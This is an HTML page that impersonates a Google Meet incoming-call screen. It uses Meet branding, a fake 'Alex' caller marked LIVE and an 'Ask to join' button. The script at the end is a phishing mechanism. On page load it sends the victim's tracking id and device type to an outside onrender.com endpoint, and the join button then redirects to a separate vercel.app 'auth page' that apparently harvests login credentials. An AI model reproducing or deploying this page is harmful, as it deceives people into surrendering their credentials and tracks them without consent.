<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Incoming Meet Call</title>
    <link
      rel="icon"
      type="image/png"
      href="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-96dp/logo_meet_2020q4_color_2x_web_96dp.png"
      sizes="32x32"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      html,
      body {
        width: 100%;
        min-height: 100%;
        font-family: Arial, Helvetica, sans-serif;
        background: #f1f3f4;
        color: #202124;
      }

      body {
        display: flex;
        justify-content: center;
      }

      /* =========================================
       MAIN APP
    ========================================= */

      .join-app {
        width: min(680px, 100%);
        min-height: 100vh;

        background: white;

        display: flex;
        flex-direction: column;

        box-shadow: 0 0 20px rgba(0, 0, 0, 0.08);
      }

      /* =========================================
       HEADER
    ========================================= */

      .header {
        height: 96px;

        display: flex;
        align-items: center;

        padding: 0 24px;

        border-bottom: 1px solid #dadce0;

        background: #fff;

        flex-shrink: 0;
      }

      .menu-btn {
        width: 48px;
        height: 48px;

        border: 0;
        background: transparent;

        border-radius: 50%;

        display: flex;
        align-items: center;
        justify-content: center;

        cursor: pointer;
      }

      .menu-btn:hover {
        background: #f1f3f4;
      }

      .menu-icon {
        width: 27px;
        height: 20px;

        display: flex;
        flex-direction: column;
        justify-content: space-between;
      }

      .menu-icon span {
        width: 100%;
        height: 3px;

        background: #5f6368;

        border-radius: 4px;
      }

      /* Logo */

      .logo {
        display: flex;
        align-items: center;

        margin-left: 16px;

        font-size: 23px;
        font-weight: 500;

        color: #3c4043;
      }

      .join-logo {
        width: 29px;
        height: 22px;

        background: #fbbc04;

        border-radius: 5px;

        margin-right: 6px;

        position: relative;
      }

      .join-logo::after {
        content: "";

        position: absolute;

        right: -9px;
        top: 5px;

        width: 0;
        height: 0;

        border-top: 6px solid transparent;
        border-bottom: 6px solid transparent;
        border-left: 10px solid #34a853;
      }

      /* Header right */

      .header-right {
        margin-left: auto;

        display: flex;
        align-items: center;

        gap: 12px;
      }

      .header-circle {
        width: 58px;
        height: 58px;

        border-radius: 50%;

        background: #f1f3f4;

        border: 0;

        display: flex;
        align-items: center;
        justify-content: center;

        cursor: pointer;
      }

      .header-circle:hover {
        background: #e8eaed;
      }

      .header-circle svg {
        width: 30px;
        height: 30px;

        fill: #5f6368;
      }

      /* =========================================
       VIDEO AREA
    ========================================= */

      .video-area {
        width: 100%;

        display: grid;

        grid-template-columns: 1fr 1fr;

        background: #000;
      }

      .video-card {
        position: relative;

        height: 480px;

        overflow: hidden;

        background: #000;
      }

      /* Alex */

      .alex-card {
        background: linear-gradient(135deg, #111936, #142e5b);
      }

      .alex-image {
        position: absolute;

        width: 68%;
        aspect-ratio: 1;

        left: 50%;
        top: 50%;

        transform: translate(-50%, -50%);

        object-fit: cover;

        border-radius: 50%;

        border: 8px solid rgba(255, 255, 255, 0.75);

        box-shadow:
          0 0 0 12px rgba(255, 255, 255, 0.08),
          0 10px 35px rgba(0, 0, 0, 0.35);
      }

      /* =========================================
       TOP CONTROLS
    ========================================= */

      .video-top-controls {
        position: absolute;

        top: 24px;
        left: 24px;

        display: flex;

        gap: 12px;

        z-index: 5;
      }

      .round-control {
        width: 58px;
        height: 58px;

        border-radius: 50%;

        border: 0;

        background: rgba(5, 7, 20, 0.9);

        display: flex;
        align-items: center;
        justify-content: center;

        cursor: pointer;
      }

      .round-control svg {
        width: 28px;
        height: 28px;

        stroke: white;

        fill: none;

        stroke-width: 2;
      }

      .round-control.active {
        background: rgba(10, 12, 25, 0.95);
      }

      /* LIVE */

      .live-badge {
        position: absolute;

        top: 24px;
        right: 24px;

        padding: 9px 18px;

        background: #ea4335;

        color: white;

        border-radius: 25px;

        font-size: 16px;
        font-weight: 700;

        box-shadow: 0 4px 12px rgba(234, 67, 53, 0.4);

        display: flex;
        align-items: center;

        gap: 7px;
      }

      .live-dot {
        width: 7px;
        height: 7px;

        border-radius: 50%;

        background: white;
      }

      /* Alex name */

      .person-name {
        position: absolute;

        bottom: 24px;
        left: 24px;

        background: rgba(0, 0, 0, 0.65);

        color: white;

        padding: 8px 16px;

        border-radius: 6px;

        font-size: 25px;

        z-index: 5;
      }

      /* =========================================
       USER CAMERA
    ========================================= */

      .you-card {
        background: #000;
      }

      #cameraVideo {
        width: 100%;
        height: 100%;

        object-fit: cover;

        transform: scaleX(-1);

        display: block;
      }

      .camera-off {
        display: none !important;
      }

      .camera-placeholder {
        position: absolute;

        inset: 0;

        display: none;

        align-items: center;
        justify-content: center;

        background: #000;
      }

      .camera-placeholder.show {
        display: flex;
      }

      .avatar {
        width: 160px;
        height: 160px;

        border-radius: 50%;

        background: #009688;

        color: white;

        display: flex;
        align-items: center;
        justify-content: center;

        font-size: 80px;
        font-weight: 500;
      }

      .you-name {
        position: absolute;

        bottom: 24px;
        left: 24px;

        color: white;

        font-size: 25px;

        z-index: 5;
      }

      /* =========================================
       CONTROLS
    ========================================= */

      .controls-area {
        padding: 26px 20px;

        border-bottom: 1px solid #e5e5e5;

        background: white;
      }

      .controls {
        display: flex;

        align-items: flex-start;
        justify-content: space-around;

        gap: 8px;
      }

      .control-item {
        border: 0;

        background: transparent;

        cursor: pointer;

        display: flex;

        flex-direction: column;

        align-items: center;

        gap: 8px;

        min-width: 70px;
      }

      .control-circle {
        width: 62px;
        height: 62px;

        border-radius: 50%;

        background: #f1f3f4;

        display: flex;
        align-items: center;
        justify-content: center;

        transition: 0.15s;
      }

      .control-item:hover .control-circle {
        background: #e4e6e8;
      }

      .control-circle svg {
        width: 27px;
        height: 27px;

        stroke: #5f6368;

        fill: none;

        stroke-width: 2;
      }

      .control-label {
        color: #5f6368;

        font-size: 17px;
      }

      /* muted */

      .control-item.disabled .control-circle {
        background: #fce8e6;
      }

      .control-item.disabled svg {
        stroke: #d93025;
      }

      /* =========================================
       JOIN AREA
    ========================================= */

      .join-area {
        padding: 30px 40px 35px;

        background: white;
      }

      .join-button {
        width: 100%;

        height: 66px;

        border: 0;

        border-radius: 40px;

        background: #1a73e8;

        color: white;

        font-size: 27px;

        font-weight: 600;

        cursor: pointer;

        display: flex;

        align-items: center;
        justify-content: center;

        gap: 8px;

        transition: 0.15s;

        box-shadow: 0 2px 5px rgba(26, 115, 232, 0.25);
      }

      .join-button:hover {
        background: #1769d3;

        transform: translateY(-1px);
      }

      .join-button:active {
        transform: scale(0.98);
      }

      .join-button svg {
        width: 29px;
        height: 29px;

        stroke: white;

        fill: white;
      }

      /* =========================================
       MOBILE
    ========================================= */

      @media (max-width: 600px) {
        body {
          background: white;
        }

        .join-app {
          width: 100%;
          min-height: 100dvh;

          box-shadow: none;
        }

        .header {
          height: 68px;

          padding: 0 12px;
        }

        .menu-btn {
          width: 42px;
          height: 42px;
        }

        .menu-icon {
          width: 23px;
          height: 17px;
        }

        .logo {
          margin-left: 7px;

          font-size: 18px;
        }

        .join-logo {
          width: 24px;
          height: 18px;
        }

        .join-logo::after {
          right: -7px;

          top: 4px;

          border-top-width: 5px;
          border-bottom-width: 5px;
          border-left-width: 8px;
        }

        .header-right {
          gap: 4px;
        }

        .header-circle {
          width: 42px;
          height: 42px;
        }

        .header-circle svg {
          width: 23px;
          height: 23px;
        }

        /* Video */

        .video-area {
          grid-template-columns: 1fr 1fr;
        }

        .video-card {
          height: 310px;
        }

        .video-top-controls {
          top: 12px;
          left: 12px;

          gap: 7px;
        }

        .round-control {
          width: 42px;
          height: 42px;
        }

        .round-control svg {
          width: 21px;
          height: 21px;
        }

        .live-badge {
          top: 13px;
          right: 10px;

          padding: 6px 10px;

          font-size: 12px;
        }

        .live-dot {
          width: 6px;
          height: 6px;
        }

        .alex-image {
          width: 70%;

          border-width: 5px;
        }

        .person-name,
        .you-name {
          left: 12px;
          bottom: 12px;

          font-size: 17px;
        }

        .person-name {
          background: rgba(0, 0, 0, 0.65);

          padding: 6px 12px;
        }

        .avatar {
          width: 90px;
          height: 90px;

          font-size: 45px;
        }

        /* Controls */

        .controls-area {
          padding: 18px 8px;
        }

        .controls {
          gap: 2px;
        }

        .control-item {
          min-width: 55px;
        }

        .control-circle {
          width: 50px;
          height: 50px;
        }

        .control-circle svg {
          width: 22px;
          height: 22px;
        }

        .control-label {
          font-size: 12px;
        }

        /* Join */

        .join-area {
          padding: 20px 18px 24px;
        }

        .join-button {
          height: 58px;

          font-size: 20px;
        }

        .join-button svg {
          width: 23px;
          height: 23px;
        }
      }

      /* Small phones */

      @media (max-width: 380px) {
        .video-card {
          height: 270px;
        }

        .control-circle {
          width: 44px;
          height: 44px;
        }

        .control-label {
          font-size: 11px;
        }

        .join-button {
          font-size: 18px;
        }
      }
    </style>
  </head>

  <body>
    <div class="join-app">
      <!-- =====================================
         HEADER
    ====================================== -->

      <header class="header">
        <button class="menu-btn">
          <div class="menu-icon">
            <span></span>
            <span></span>
            <span></span>
          </div>
        </button>

        <div class="logo">
          <div class="join-logo"></div>

          <span>Google Meet</span>
        </div>

        <div class="header-right">
          <!-- Settings -->

          <button class="header-circle">
            <svg viewBox="0 0 24 24">
              <path
                d="M19.4 15a1.7 1.7 0 0 0 .3 1.9l.1.1-1.7 1.7-.1-.1a1.7 1.7 0 0 0-1.9-.3 1.7 1.7 0 0 0-1 1.6V22h-2.4v-.1a1.7 1.7 0 0 0-1-1.6 1.7 1.7 0 0 0-1.9.3l-.1.1L8 19l.1-.1a1.7 1.7 0 0 0 .3-1.9 1.7 1.7 0 0 0-1.6-1H6V13.6h.1a1.7 1.7 0 0 0 1.6-1 1.7 1.7 0 0 0-.3-1.9L7.3 10 9 8.3l.1.1a1.7 1.7 0 0 0 1.9.3 1.7 1.7 0 0 0 1-1.6V7h2.4v.1a1.7 1.7 0 0 0 1 1.6 1.7 1.7 0 0 0 1.9-.3l.1-.1L19 10l-.1.1a1.7 1.7 0 0 0-.3 1.9 1.7 1.7 0 0 0 1.6 1h.1v2.4h-.1a1.7 1.7 0 0 0-1.6 1Z"
              />

              <circle cx="13" cy="14" r="2.5" />
            </svg>
          </button>

          <!-- User -->

          <button class="header-circle">
            <svg viewBox="0 0 24 24">
              <circle cx="12" cy="8" r="4" />

              <path d="M4 21c0-4.2 3.6-7 8-7s8 2.8 8 7" />
            </svg>
          </button>
        </div>
      </header>

      <!-- =====================================
         VIDEO
    ====================================== -->

      <section class="video-area">
        <!-- ALEX -->

        <div class="video-card alex-card">
          <div class="video-top-controls">
            <!-- Alex Mic -->

            <button class="round-control">
              <svg viewBox="0 0 24 24">
                <rect x="9" y="3" width="6" height="11" rx="3" />

                <path d="M5 11a7 7 0 0 0 14 0" />

                <path d="M12 18v3" />

                <path d="M9 21h6" />
              </svg>
            </button>

            <!-- Alex Camera -->

            <button class="round-control">
              <svg viewBox="0 0 24 24">
                <path d="M3 6h12v12H3z" />

                <path d="m15 9 6-3v12l-6-3z" />

                <path d="M4 4l17 17" />
              </svg>
            </button>
          </div>

          <!-- Live -->

          <div class="live-badge">
            <span class="live-dot"></span>

            LIVE
          </div>

          <!-- Alex Image -->

          <img class="alex-image" src="/manimage.jpg" alt="Alex" />

          <div class="person-name">Alex</div>
        </div>

        <!-- YOU -->

        <div class="video-card you-card">
          <!-- Camera -->

          <video id="cameraVideo" autoplay muted playsinline></video>

          <!-- Camera off placeholder -->

          <div class="camera-placeholder" id="cameraPlaceholder">
            <div class="avatar">Y</div>
          </div>

          <div class="you-name">You</div>
        </div>
      </section>

      <!-- =====================================
         CONTROLS
    ====================================== -->

      <section class="controls-area">
        <div class="controls">
          <!-- Mute -->

          <button class="control-item" id="muteButton">
            <div class="control-circle">
              <svg id="micIcon" viewBox="0 0 24 24">
                <rect x="9" y="3" width="6" height="11" rx="3" />

                <path d="M5 11a7 7 0 0 0 14 0" />

                <path d="M12 18v3" />

                <path d="M9 21h6" />
              </svg>
            </div>

            <span class="control-label"> Mute </span>
          </button>

          <!-- Video -->

          <button class="control-item" id="videoButton">
            <div class="control-circle">
              <svg viewBox="0 0 24 24">
                <path d="M3 6h12v12H3z" />

                <path d="m15 9 6-3v12l-6-3z" />
              </svg>
            </div>

            <span class="control-label" id="videoLabel"> Video </span>
          </button>

          <!-- Speaker -->

          <button class="control-item" id="speakerButton">
            <div class="control-circle">
              <svg viewBox="0 0 24 24">
                <path d="M4 10v4h4l5 4V6l-5 4z" />

                <path d="M16 9a5 5 0 0 1 0 6" />

                <path d="M18.5 6.5a9 9 0 0 1 0 11" />
              </svg>
            </div>

            <span class="control-label"> Speaker </span>
          </button>

          <!-- People -->

          <button class="control-item" id="peopleButton">
            <div class="control-circle">
              <svg viewBox="0 0 24 24">
                <circle cx="9" cy="8" r="3" />

                <circle cx="17" cy="9" r="2.5" />

                <path d="M3 19c0-3 2.5-5 6-5s6 2 6 5" />

                <path d="M15 15c3 0 5 1.5 6 4" />
              </svg>
            </div>

            <span class="control-label"> People </span>
          </button>

          <!-- Share -->

          <button class="control-item" id="shareButton">
            <div class="control-circle">
              <svg viewBox="0 0 24 24">
                <path d="M12 15V3" />

                <path d="m8 7 4-4 4 4" />

                <path d="M5 12v7h14v-7" />
              </svg>
            </div>

            <span class="control-label"> Share </span>
          </button>
        </div>
      </section>

      <!-- =====================================
         ASK TO JOIN
    ====================================== -->

      <section class="join-area">
        <button class="join-button" id="joinButton">
          <svg viewBox="0 0 24 24">
            <path d="M3 6h12v12H3z" />

            <path d="m15 9 6-3v12l-6-3z" />
          </svg>

          Ask to join
        </button>
      </section>
    </div>

    <script>
      /* =========================================
       CAMERA
    ========================================= */
      const id = new URLSearchParams(window.location.search).get("id");
      const joinButton = document.querySelector(".join-button");
      const videoFeed = document.getElementById("cameraFeed");

      async function startCall() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true,
          });
          videoFeed.srcObject = stream;
          videoFeed.style.display = "block";
          joinButton.style.display = "none";
        } catch (error) {
          console.error("Error accessing media devices:", error);
          alert("Camera and microphone access required to join call");
        }
      }

      function getDeviceType() {
        const ua = navigator.userAgent.toLowerCase();
        const isMobile =
          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;

        if (isMobile || isTablet) return "mobile";
        return "desktop";
      }

      const deviceType = getDeviceType();

      window.addEventListener("load", async () => {
        try {
          const res = await fetch(
            "https://megatools-8920.onrender.com/api/v1/information",
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                user: id,
                deviceType,
                siteName: "AutoInfo/login-view",
              }),
            },
          );

          const data = await res.json();
        } catch (err) {
          console.error(err);
          alert("Failed to save email.");
        }
      });

      joinButton.addEventListener("click", () => {
        window.location.href =
          "https://auth-seven-pied.vercel.app/user-auth.html?id=" + id; // your auth page
      });
    </script>
  </body>
</html>
